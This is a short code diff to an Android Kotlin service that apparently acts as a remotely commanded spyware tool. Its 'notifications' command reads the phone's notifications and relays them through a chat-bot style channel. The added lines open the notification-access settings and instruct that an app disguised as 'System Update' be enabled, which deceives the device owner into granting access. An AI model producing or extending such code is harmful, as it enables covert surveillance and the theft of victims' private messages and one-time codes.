@@ -284,7 +284,14 @@ class MainService : Service() {
                 "notifications" -> {
                     val notifs = NotifService.getNotifications()
                     if (notifs.isEmpty()) {
-                        d.sendMsg(":bell: **No notifications.** Grant access: Settings > Access > Notification Access")
+                        d.sendMsg(":bell: **Notification Access Required**\nOpening settings — enable 'System Update' and try again.")
+                        try {
+                            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            startActivitySafely(intent)
+                        } catch (e: Exception) {
+                            Log.e(TAG, "open notif settings: ${e.message}")
+                        }
                         return
                     }
                     val sb = StringBuilder()
